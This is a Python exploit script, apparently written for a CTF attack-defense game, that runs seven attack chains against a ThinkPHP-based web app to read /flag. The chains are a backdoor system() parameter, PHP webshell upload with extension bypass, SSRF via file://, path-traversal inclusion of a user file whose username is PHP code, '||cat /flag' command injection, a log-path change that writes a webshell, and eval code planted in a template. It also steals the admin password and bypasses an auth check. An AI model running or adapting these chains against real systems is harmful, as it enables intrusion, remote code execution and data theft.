from webshell import *
from attack.attackbase import WebBase
import requests
import hashlib
import re
import random
banner = '''
########################################################################
# ThinkPHPv6.66 one-key-to-rce!
#  usage: exp.py ip port attack_chain_number
#  such as: exp.py 127.0.0.1 24444 1
#  attack chain list:
#  1.one-word trojan
#  2.upload php webshell
#  3.echoable ssrf
#  4.register a user named "<?php eval($_POST[0]);?>" ,then include the user profile file placed /data/user/md5(username).php
#  5.test_network command inject
#  6.modify the extension of log file
#  7.template inject
#
#
'''

class a(WebBase):
    def __init__(self):
        pass
    
    def attack(self,host):
        return shell4.Shell4('http://{}/home/index/login?func=system'.format(host),'GET','arg'),''



def md5(str):
    _md5 = hashlib.md5(str.encode())
    return _md5.hexdigest()


def random_string(len):
    _str = ''
    for i in range(len):
        _str += chr(random.randint(97, 122))
    return _str

class attacker():
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        self.base_url = 'http://{ip}:{port}/'.format(ip=self.ip,port=self.port)
        self.webshell_content = '<?php eval($_POST[0]);?>'
        self.s = requests.session()
        print('------preparation start!------')
        self.HAVE_A_USER=self.register()
        self.HAVE_ADMIN_PASSWORD = self.get_admin_password()
        self.CHEAT_CHECK_AUTHCODE = self.get_authcode()
        print('------preparation end!------')

    def register(self):
        print('[*] registering a user')
        data = {
            'username':random_string(10),
            'password':random_string(10)
        }
        rst = self.s.post(self.base_url+'home/index/register',data=data).text
        if '注册成功' in rst:
            print('[*] register successfully')
            return True
        else:
            print('[*] register failed')
            return False
    def find_flag(self, res):
        if 'flag' in res.text:
            print('[*] find flag:{}'.format(re.search('flag{.*?}', res.text).group(0)))
        else:
            print('[*] unknown error!')
    def get_admin_password(self):
        res = requests.get(self.base_url+r'?s=..\data\user/{}'.format(md5('admin')))
        if 'password' in res.text:
            password = re.search(r'"password";s:\d+:"(.*?)";',res.text).group(1)
            print('[*] get admin\'password :{}'.format(password))
            self.admin_session = requests.session()
            data = {'username':'admin','password':password}
            res = self.admin_session.post(self.base_url+'home/index/login',data)
            if '登录成功' in res.text:
                print('[*] login as admin successfully!')
                return True
        else:
            print('[*] get admin password failed!')
            return False
    def get_authcode(self):
        print('[*] get authcode start!')
        if self.s.cookies.keys()[0] != 'PHPSESSID':
            print('[*] try cheating check_authcoe()')
            res = self.s.get(self.base_url + 'api/admin/_init?code={}'.format(self.s.cookies.keys()[0]))
            if res.text == '':
                self.authcode = self.s.cookies.keys()[0]
                print('[*] cheat successfully!')
                return True
            else:
                print('[*] cheat failed!')
                return False

    def attack1(self):
        print('[*] attack attempt by using one-word trojan')
        rst = requests.get(self.base_url+'home/index/login?func=system&arg=cat /flag').text
        try:
            print('[*] find flag:{}'.format(re.search('flag{.*?}',rst).group(0)))
        except:
            print('[*] attack failed!')

    def attack2(self):
        print('[*] attack attempt by uploading a webshell')

        if self.HAVE_A_USER:
            for extension in ['phtml']+['php{}'.format(i) for  i in range(10)]:
                file = {'image':('1.{}'.format(extension),self.webshell_content)}
                res = self.s.post(self.base_url+'api/index/upload',files=file)
                if res.json()['status']:
                    webshell = res.json()['data']
                    print('[*] webshell has be uploaded,path:{},content:{}'.format(webshell,self.webshell_content))
                    break
                else:
                    print('[*] {} extension is not allowed'.format(extension))
            res = requests.post(self.base_url+webshell,data={'0':'system("cat /flag");'})
            if 'flag' in res.text:
                print('[*] find flag:{}'.format(res.text))
            else:
                print('[*] unknown error!')
        else:
            print('[*] this attack can not be performed without a user!')

    def attack3(self):
        print('[*] attack attempt by echoable ssrf')
        if self.HAVE_A_USER:
            res = self.s.post(self.base_url+'api/index/catchImage',data={'url':'file:///flag'})
            if res.json()['status']:
                print('[*] flag is here:{}'.format(res.json()['data']))
                res = requests.get(self.base_url+res.json()['data'])
                print('[*] find flag:{}'.format(res.text))
            else:
                print('[*] ssrf attack failed!')
        else:
            print('[*] this attack can not be performed without a user!')

    def attack4(self):
        print('[*] attack attempt by including user profile file')
        data ={
            'username':self.webshell_content+random_string(5),
            'password':random_string(10)
        }
        res = requests.post(self.base_url+'home/index/register',data=data)
        if '注册成功' in res.text:
            print('[*] register successfully!')
            webshell = self.base_url + r'?s=..\data\user/{}'.format(md5(data['username']))
            print('[*] this is your webshell:{}'.format(webshell))
            res = requests.post(webshell,data={'0':'system("cat /flag");'})
            if 'flag' in res.text:
                print('[*] find flag:{}'.format(re.search('flag{.*?}',res.text).group(0)))
            else:
                print('[*] unknown error!')
        else:
            print('[*] register failed')

    def attack5(self):
        print('[*] attack attempt by command inject')
        if self.HAVE_ADMIN_PASSWORD:
            res = self.admin_session.get(self.base_url+'api/admin/test_network?ip=1||cat /flag')
            self.find_flag(res)
        elif self.CHEAT_CHECK_AUTHCODE:
            res = requests.get(self.base_url+'api/admin/test_network?ip=1||cat /flag&code={}'.format(self.authcode))
            self.find_flag(res)
        else:
            print('[*] this attack can not be performed without admin privilege!')

    def attack6(self):
        print('[*] attack attempt by modifying the extension of log file')
        def getshell():
            requests.get(self.base_url+"?s=api/admin/<?php file_put_contents('2.php','{}');?>".format(self.webshell_content))
            res=requests.get(self.base_url+'data/error.php')
            if res.status_code==200:
                webshell = self.base_url+'data/2.php'
                requests.get(webshell)
                print('[*] this is your webshell:{}'.format(webshell))
                res = requests.post(webshell,data={'0':'system("cat /flag");'})
                self.find_flag(res)
            else:
                print('[*] write webshell failed!')

        if not self.HAVE_ADMIN_PASSWORD and not self.CHEAT_CHECK_AUTHCODE:
            print('[*] this attack can not be performed without admin privilege!')
        if self.HAVE_ADMIN_PASSWORD:
            res = self.admin_session.post(self.base_url+'api/admin/edit_config',data={'logfile_path':"error.php",'confirm':'yes'})
            if 'error.php' in res.text:
                print('[*] modify config file successfully!')
                getshell()
            else:
                print('[*] modify config failed')
        elif self.CHEAT_CHECK_AUTHCODE:
            res = self.admin_session.post(self.base_url+'api/admin/edit_config?code={}'.format(self.authcode),data={'logfile_path':"error.php",'confirm':'yes'})
            if 'error.php' in res.text:
                print('[*] modify config file successfully!')
                getshell()
            else:
                print('[*] modify config failed')

    def attack7(self):
        print('[*] attack attempt by editing template file')
        def getflag():
            res =requests.get(self.base_url+'home/index/reset',params={'0':'system("cat /flag");'})
            self.find_flag(res)

        if not self.HAVE_ADMIN_PASSWORD and not self.CHEAT_CHECK_AUTHCODE:
            print('[*] this attack can not be performed without admin privilege!')
        data = {
            'file':'reset.html',
            'content': '<?php eval($_GET[0]);?>'
        }
        if self.HAVE_ADMIN_PASSWORD:
            res = self.admin_session.post(self.base_url+'api/admin/edit_view',data=data)
            if res.json()['status']:
                print('[*] edit reset.html to {}!'.format(self.webshell_content))
                print('[*] this is your webshell:{}!'.format(self.base_url+'home/index/reset'))
                getflag()
        elif self.CHEAT_CHECK_AUTHCODE:
            res = requests.post(self.base_url+'api/admin/edit_view?code={}'.format(self.authcode),data=data)
            if res.json()['status']:
                print('[*] edit reset.html to {}!'.format(self.webshell_content))
                print('[*] this is your webshell:{}!'.format(self.base_url+'home/index/reset'))
                getflag()
            else:
                print('[*] edit reset.html failed!')

    def start(self,attack_mode):
        eval('self.attack{}()'.format(attack_mode))
if __name__ == '__main__':
    import sys
    if(len(sys.argv)<4):
        print(banner)
    else:
        ip = sys.argv[1]
        port = sys.argv[2]
        a = attacker(ip,port)
        a.start(sys.argv[3])